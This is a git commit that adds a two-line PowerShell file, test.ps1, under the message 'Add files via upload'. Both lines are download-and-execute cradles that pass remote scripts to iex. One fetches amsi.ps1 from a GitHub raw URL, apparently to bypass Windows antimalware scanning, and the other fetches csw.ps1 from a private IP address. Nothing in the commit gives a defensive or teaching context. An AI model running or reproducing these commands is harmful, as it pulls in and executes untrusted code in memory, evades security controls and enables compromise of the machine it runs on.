fc847dbd8dd30d23ea1ff82c5beee9876b922149
watto33 <38833570+watto33@users.noreply.github.com>
2022-07-20 13:00:02 +0530

    Add files via upload

---
+++ test.ps1
@@ -0,0 +1,2 @@
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/watto33/temp/main/amsi.ps1')
+iex(new-object net.webclient).downloadstring('http://192.168.240.60/csw.ps1')
